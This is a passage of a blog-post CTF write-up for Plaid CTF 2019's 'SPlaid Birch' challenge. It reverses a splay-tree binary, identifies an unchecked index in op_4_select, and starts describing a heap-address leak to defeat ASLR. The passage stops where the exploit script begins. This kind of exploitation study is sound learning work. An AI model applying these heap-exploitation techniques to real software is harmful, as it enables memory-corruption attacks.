@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>SPlaid Birch -- Plaid CTF 2019 - Pedro Bernardo</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="With jofra
+Points: 300 Solves: 41 Description:
+I make sure never to use
+scanf(&quot;%s&quot;)
+when doing competitive programming so that my solutions don&rsquo;t have buffer overflows. But writing algorithms is hard.
+Recon We are given an ELF 64-bit x86/64 stripped binary, a libc and an external library lisplaid.so.1. After reversing this library a bit, we realized that it is an implementation of Splay Trees.
+From wikipedia:
+A splay tree is a self-balancing binary search tree with the additional property that recently accessed elements are quick to access again." />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="SPlaid Birch -- Plaid CTF 2019" />
+<meta property="og:description" content="With jofra
+Points: 300 Solves: 41 Description:
+I make sure never to use
+scanf(&quot;%s&quot;)
+when doing competitive programming so that my solutions don&rsquo;t have buffer overflows. But writing algorithms is hard.
+Recon We are given an ELF 64-bit x86/64 stripped binary, a libc and an external library lisplaid.so.1. After reversing this library a bit, we realized that it is an implementation of Splay Trees.
+From wikipedia:
+A splay tree is a self-balancing binary search tree with the additional property that recently accessed elements are quick to access again." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/blog/posts/2019-4-19-plaidctf19_splaid_birch/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2019-04-19T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-04-19T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SPlaid Birch -- Plaid CTF 2019"/>
+<meta name="twitter:description" content="With jofra
+Points: 300 Solves: 41 Description:
+I make sure never to use
+scanf(&quot;%s&quot;)
+when doing competitive programming so that my solutions don&rsquo;t have buffer overflows. But writing algorithms is hard.
+Recon We are given an ELF 64-bit x86/64 stripped binary, a libc and an external library lisplaid.so.1. After reversing this library a bit, we realized that it is an implementation of Splay Trees.
+From wikipedia:
+A splay tree is a self-balancing binary search tree with the additional property that recently accessed elements are quick to access again."/>
+<script src="//localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="//localhost:1313/css/fonts.0db1b638c3c6b12e3f0bf5303b558492d936bf9102ec4c4ba2bdc315e2a4184f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="//localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="//localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"   />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="//localhost:1313/">Pedro Bernardo</a>
+	</div>
+	<nav>
+		
+		<a href="/blog">Blog</a>
+		
+		<a href="/blog/posts">All posts</a>
+		
+		<a href="/tags">Tags</a>
+		
+		<a href="/">CV</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">SPlaid Birch -- Plaid CTF 2019</h1>
+			<div class="meta">Posted on Apr 19, 2019</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<p>With <a href="https://twitter.com/V_jofra">jofra</a></p>
+<p><strong>Points:</strong> 300
+<strong>Solves:</strong> 41
+<strong>Description:</strong></p>
+<blockquote>
+<p>I make sure never to use</p>
+<p>scanf(&quot;%s&quot;)</p>
+<p>when doing competitive programming so that my solutions don&rsquo;t have buffer overflows. But writing algorithms is hard.</p>
+</blockquote>
+<h2 id="recon">Recon</h2>
+<p>We are given an ELF 64-bit x86/64 stripped binary, a libc and an external library lisplaid.so.1.
+After reversing this library a bit, we realized that it is an implementation of <strong>Splay Trees</strong>.</p>
+<p>From wikipedia:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>A splay tree is a self-balancing binary search tree
+</span></span><span style="display:flex;"><span>with the additional property that recently accessed
+</span></span><span style="display:flex;"><span>elements are quick to access again.
+</span></span></code></pre></div><p>Basically, this is done by making the last accessed node the root of the tree. This operation is called <strong>splaying</strong>.</p>
+<h2 id="reversing-the-binary">Reversing the binary</h2>
+<p>Running checksec on the binary gives us the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ checksec splaid-birch
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">&#39;/home/bl4ck/WiP/pwn/splaid-birch/splaid-birch&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
+</span></span><span style="display:flex;"><span>    FORTIFY:  Enabled
+</span></span></code></pre></div><p>Looking at the binary, we identified the following structures:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">struct</span> sp_tree {
+</span></span><span style="display:flex;"><span>  sp_node <span style="color:#ff7b72;font-weight:bold">*</span>root_node;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>func_1;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">void</span> (<span style="color:#ff7b72;font-weight:bold">*</span>func_2)(sp_node <span style="color:#ff7b72;font-weight:bold">*</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>func_3;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">int64_t</span> allocated_sz;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">int64_t</span> sz;
+</span></span><span style="display:flex;"><span>  super_node <span style="color:#ff7b72;font-weight:bold">**</span>nodes;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">struct</span> sp_node {
+</span></span><span style="display:flex;"><span>  sp_node <span style="color:#ff7b72;font-weight:bold">*</span>parent;
+</span></span><span style="display:flex;"><span>  sp_node <span style="color:#ff7b72;font-weight:bold">*</span>left;
+</span></span><span style="display:flex;"><span>  sp_node <span style="color:#ff7b72;font-weight:bold">*</span>right;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">int64_t</span> sz;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">struct</span> super_node
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">int64_t</span> node_val;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">int64_t</span> node_val_2;
+</span></span><span style="display:flex;"><span>  <span style="color:#8b949e;font-style:italic">/* unknown fields */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">int64_t</span> unk_4;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">int64_t</span> unk_1;
+</span></span><span style="display:flex;"><span>  <span style="color:#8b949e;font-style:italic">/* ============== */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">int64_t</span> node_i;
+</span></span><span style="display:flex;"><span>  sp_node node;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>In the main function, an <code>sp_tree</code> struct is created on the stack and initialized like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  sp_tree tree;
+</span></span><span style="display:flex;"><span>  tree.root_node <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0LL</span>;
+</span></span><span style="display:flex;"><span>  tree.func_1 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0LL</span>;
+</span></span><span style="display:flex;"><span>  tree.func_2 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0LL</span>;
+</span></span><span style="display:flex;"><span>  tree.func_3 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0LL</span>;
+</span></span><span style="display:flex;"><span>  tree.sz <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0LL</span>;
+</span></span><span style="display:flex;"><span>  tree.allocated_sz <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0xALL</span>;
+</span></span><span style="display:flex;"><span>  tree.nodes <span style="color:#ff7b72;font-weight:bold">=</span> (super_node <span style="color:#ff7b72;font-weight:bold">**</span>)<span style="color:#d2a8ff;font-weight:bold">malloc_</span>(<span style="color:#a5d6ff">0x50uLL</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#8b949e;font-style:italic">/* libsplaid.so.1 function */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">sp_init</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>tree, func_3, func_1, func_2);
+</span></span></code></pre></div><p>func_1 func_2 and func_3 are defined in the binary, and serve as comparators for the operations performed by the Splay Tree implementation.</p>
+<p>The program then takes our input as unsigned longs and assigns it to the variables op, v3, v5 and v6.
+Then, it runs it through the following switch statement:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">switch</span> ( op ){
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">5uLL</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">op_5_add_node</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>tree, v5, v6);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">1uLL</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">op_1_del_node</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>tree, v5);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">2uLL</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>        v7 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">op_2_get</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>tree, v5);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">print_nr</span>(v7);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">3uLL</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>        v8 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">op_3_nth</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>tree, v5);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">print_nr</span>(v8);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">4uLL</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>        v9 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">op_4_select</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>tree, v5);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">print_nr</span>(v9);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">6uLL</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>        v10 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">op_6_isolate_1</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>tree, v5, v6);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">print_nr</span>((<span style="color:#ff7b72">__int64</span>)v10);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">7uLL</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">op_7_isolate_2</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>tree, v5, v6, v3);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">0uLL</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>        result <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0LL</span>;
+</span></span><span style="display:flex;"><span>        v12 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#d2a8ff;font-weight:bold">MK_FP</span>(__FS__, <span style="color:#a5d6ff">40LL</span>) <span style="color:#ff7b72;font-weight:bold">^</span> v14;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span> result;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">default</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>There are three important functions to look at:
+1.<code>op_1_del_node</code>
+2.<code>op_4_select</code>
+3.<code>op_5_add_node</code></p>
+<p><code>op_1_del_node</code> simply calls <code>sp_del</code> with the provided <code>node_val</code> and then uses it to find and free the corresponding node in the tree.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">op_1_del_node</span>(sp_tree <span style="color:#ff7b72;font-weight:bold">*</span>tree, <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">__int64</span> node_i_to_del)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>v2;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  v2 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">sp_del</span>(tree, node_i_to_del);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> ( v2 )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    tree<span style="color:#ff7b72;font-weight:bold">-&gt;</span>nodes[<span style="color:#ff7b72;font-weight:bold">*</span>((_QWORD <span style="color:#ff7b72;font-weight:bold">*</span>)v2 <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">1</span>)] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0LL</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">free</span>((<span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">*</span>)v2 <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">40</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The <code>op_5_add_node</code> function checks the amount of nodes added so far. If this amount matches the currently allocated size, then a realloc is performed on the <code>tree-&gt;nodes</code> array and with double it&rsquo;s original size. If there is no free space adjacent to the buffer that&rsquo;s being reallocated, it will free the previous buffer and allocate a new one, with the specified size. The contents of the previous buffer are then copied to the new one. This will be handy for our exploit.</p>
+<p>Also, if <code>sp_add</code> does not successfully add the new node, it will be freed. One of the ways <code>sp_add</code> can fail is by adding a node with a <code>node-&gt;node_val</code> equal to another node already on the tree.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">op_5_add_node</span>(sp_tree <span style="color:#ff7b72;font-weight:bold">*</span>tree, <span style="color:#ff7b72">__int64</span> a2, <span style="color:#ff7b72">__int64</span> a3)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">__int64</span> v3;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">__int64</span> v4;
+</span></span><span style="display:flex;"><span>  super_node <span style="color:#ff7b72;font-weight:bold">*</span>new_node;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">int64_t</span> v6;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  v3 <span style="color:#ff7b72;font-weight:bold">=</span> a2;
+</span></span><span style="display:flex;"><span>  v4 <span style="color:#ff7b72;font-weight:bold">=</span> a3;
+</span></span><span style="display:flex;"><span>  new_node <span style="color:#ff7b72;font-weight:bold">=</span> (super_node <span style="color:#ff7b72;font-weight:bold">*</span>)<span style="color:#d2a8ff;font-weight:bold">malloc_</span>(<span style="color:#a5d6ff">0x48uLL</span>);
+</span></span><span style="display:flex;"><span>  v6 <span style="color:#ff7b72;font-weight:bold">=</span> tree<span style="color:#ff7b72;font-weight:bold">-&gt;</span>sz;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> ( v6 <span style="color:#ff7b72;font-weight:bold">==</span> tree<span style="color:#ff7b72;font-weight:bold">-&gt;</span>allocated_sz )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    tree<span style="color:#ff7b72;font-weight:bold">-&gt;</span>allocated_sz <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">2</span> <span style="color:#ff7b72;font-weight:bold">*</span> v6;
+</span></span><span style="display:flex;"><span>    tree<span style="color:#ff7b72;font-weight:bold">-&gt;</span>nodes <span style="color:#ff7b72;font-weight:bold">=</span> (super_node <span style="color:#ff7b72;font-weight:bold">**</span>)<span style="color:#d2a8ff;font-weight:bold">realloc_</span>(tree<span style="color:#ff7b72;font-weight:bold">-&gt;</span>nodes, <span style="color:#a5d6ff">16</span> <span style="color:#ff7b72;font-weight:bold">*</span> v6);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  new_node<span style="color:#ff7b72;font-weight:bold">-&gt;</span>node_i <span style="color:#ff7b72;font-weight:bold">=</span> tree<span style="color:#ff7b72;font-weight:bold">-&gt;</span>sz;
+</span></span><span style="display:flex;"><span>  new_node<span style="color:#ff7b72;font-weight:bold">-&gt;</span>node_val <span style="color:#ff7b72;font-weight:bold">=</span> v3;
+</span></span><span style="display:flex;"><span>  new_node<span style="color:#ff7b72;font-weight:bold">-&gt;</span>node_val_2 <span style="color:#ff7b72;font-weight:bold">=</span> v4;
+</span></span><span style="display:flex;"><span>  new_node<span style="color:#ff7b72;font-weight:bold">-&gt;</span>unk_4 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0LL</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> ( <span style="color:#d2a8ff;font-weight:bold">sp_add</span>(tree, <span style="color:#ff7b72;font-weight:bold">&amp;</span>new_node<span style="color:#ff7b72;font-weight:bold">-&gt;</span>node) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    tree<span style="color:#ff7b72;font-weight:bold">-&gt;</span>nodes[new_node<span style="color:#ff7b72;font-weight:bold">-&gt;</span>node_i] <span style="color:#ff7b72;font-weight:bold">=</span> new_node;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">++</span>tree<span style="color:#ff7b72;font-weight:bold">-&gt;</span>sz;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">free</span>(new_node);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Given this, we have pretty much full control over the operations performed on the tree.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Let&rsquo;s look at the <code>op_4_select</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>      <span style="color:#8b949e;font-style:italic">// (...)
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>      <span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">4uLL</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>        v9 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">op_4_select</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>tree, v5);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">print_nr</span>(v9); <span style="color:#8b949e;font-style:italic">// node-&gt;node_val_2 is printed
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>        <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#8b949e;font-style:italic">// (...)
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">int64_t</span> <span style="color:#ff7b72">__fastcall</span> <span style="color:#d2a8ff;font-weight:bold">op_4_select</span>(sp_tree <span style="color:#ff7b72;font-weight:bold">*</span>tree, <span style="color:#ff7b72">__int64</span> node_idx) {
+</span></span><span style="display:flex;"><span>  super_node <span style="color:#ff7b72;font-weight:bold">*</span>v2; <span style="color:#8b949e;font-style:italic">// rbx@1
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>  v2 <span style="color:#ff7b72;font-weight:bold">=</span> tree<span style="color:#ff7b72;font-weight:bold">-&gt;</span>nodes[node_idx]; <span style="color:#8b949e;font-style:italic">// OOBR here
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>  <span style="color:#d2a8ff;font-weight:bold">sp_select</span>(tree, <span style="color:#ff7b72;font-weight:bold">&amp;</span>v2<span style="color:#ff7b72;font-weight:bold">-&gt;</span>node);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">return</span> v2<span style="color:#ff7b72;font-weight:bold">-&gt;</span>node_val_2;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>By controlling the <code>node_idx</code> parameter (which we do) we can perform an <code>sp_select</code> on any &ldquo;node&rdquo; on the heap, since there is <strong>no bounds check</strong>. The <code>sp_select</code> function looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">/* libsplaid.so.1 */</span>
+</span></span><span style="display:flex;"><span>sp_node <span style="color:#d2a8ff;font-weight:bold">sp_select</span>(sp_tree <span style="color:#ff7b72;font-weight:bold">*</span>tree, sp_node <span style="color:#ff7b72;font-weight:bold">*</span>node_to_select) {
+</span></span><span style="display:flex;"><span>  sp_node <span style="color:#ff7b72;font-weight:bold">*</span>result;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  result <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">splay</span>(node_to_select, tree<span style="color:#ff7b72;font-weight:bold">-&gt;</span>func_2);
+</span></span><span style="display:flex;"><span>  tree<span style="color:#ff7b72;font-weight:bold">-&gt;</span>root_node <span style="color:#ff7b72;font-weight:bold">=</span> result;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We have to ensure a couple of things to guarantee the program doesn&rsquo;t crash during the <strong>splay</strong>:</p>
+<ol>
+<li><code>node_to_select</code> is a valid pointer to a node (or null)</li>
+<li><code>node_to_select-&gt;parent</code>, <code>node_to_select-&gt;left</code>, <code>node_to_select-&gt;right</code> are all null or another valid node</li>
+</ol>
+<h2 id="exploit">Exploit</h2>
+<h3 id="heap-leak">Heap Leak</h3>
+<p>To defeat ASLR we need to leak some addresses. The first leak we need is a heap address. This will allow us to have more control over the fake node we are selecting. We achieve this with the Out-Of-Bounds Read (<strong>OOBR</strong>) we found before.</p>
+<p>After a bit of experimentation, we were able to setup the heap to have this <strong>fake node</strong> we can index to (and doesn&rsquo;t crash on splay):</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>tree-&gt;nodes[node_idx]
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>0x555555758858: 0x0000000000000000  --&gt; node-&gt;node_val
+</span></span><span style="display:flex;"><span>0x555555758860: 0x0000555555758718  --&gt; node-&gt;node_val_2 (will be printed)
+</span></span><span style="display:flex;"><span>0x555555758868: 0x0000000000000000  --&gt; node-&gt;unk_4
+</span></span><span style="display:flex;"><span>0x555555758870: 0x0000000000000006  --&gt; node-&gt;unk_1
+</span></span><span style="display:flex;"><span>0x555555758878: 0x000000000001f791  --&gt; node-&gt;node_i
+</span></span><span style="display:flex;"><span>0x555555758880: 0x0000000000000000  --&gt; node-&gt;parent
+</span></span><span style="display:flex;"><span>0x555555758888: 0x0000000000000000  --&gt; node-&gt;left
+</span></span><span style="display:flex;"><span>0x555555758890: 0x0000000000000000  --&gt; node-&gt;right
+</span></span><span style="display:flex;"><span>0x555555758898: 0x0000000000000000  --&gt; node-&gt;sz
+</span></span></code></pre></div><p>As we have seen before <code>node-&gt;node_val_2</code> is printed, allowing us to leak an heap address and <strong>de-randomize the heap</strong>.</p>
+<p>This is the code we wrote to accomplish it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># ==========</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># Leak heap ptr</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># ==========</span>
